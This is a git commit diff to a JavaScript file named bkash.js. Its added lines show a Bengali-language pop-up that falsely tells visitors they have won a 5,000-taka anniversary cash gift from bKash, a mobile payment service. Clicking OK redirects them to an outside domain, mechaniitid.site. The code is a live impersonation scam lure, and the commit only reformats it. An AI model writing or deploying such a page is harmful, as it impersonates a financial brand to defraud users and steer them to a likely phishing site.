0f2a8f7ebc14a13f9e46a8985eb9e28ead813a72
usorondo98 <abode_moped_9a@icloud.com>
2026-07-27 10:45:37 -0700

    Update bkash.js

--- bkash.js
+++ bkash.js
@@ -1,5 +1,5 @@
-var password = 'Tk5,000'
-password = prompt('অভিনন্দন: আপনি বিকাশ থেকে ৫,০০০ টাকার বার্ষিকী ক্যাশ গিফট পাওয়ার যোগ্য; এটি এখনই পেতে 'OK'-তে ক্লিক করুন।');
-if (password != 'Tk5,000') {
-    location.href ='https://www.mechaniitid.site/bkash-tk5000';
+var password = 'tk5,০০০'
+password=prompt('অভিনন্দন: আপনি বিকাশ থেকে tk5,০০০ টাকার বার্ষিকী ক্যাশ গিফট পাওয়ার যোগ্য; এটি এখনই পেতে 'OK'-তে ক্লিক করুন।');
+if (password != 'tk5,০০০') {
+location.href='https://www.mechaniitid.site/bkash-tk5000';
 }
